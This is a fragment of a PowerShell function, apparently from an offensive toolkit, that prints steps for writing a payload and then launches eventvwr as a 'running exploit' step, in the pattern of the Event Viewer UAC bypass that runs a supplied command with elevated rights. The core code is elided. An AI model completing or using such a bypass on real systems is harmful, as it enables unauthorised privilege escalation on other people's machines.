function Invoke-EventViewer {
    if ($args){
        ...
        echo "[ 4 ] writing payload"
        WriteFile

        echo "[ 5 ] running exploit"
        eventvwr
    }
    else {
        echo '[ error ] Usage: Invoke-EventViewer commandhere'
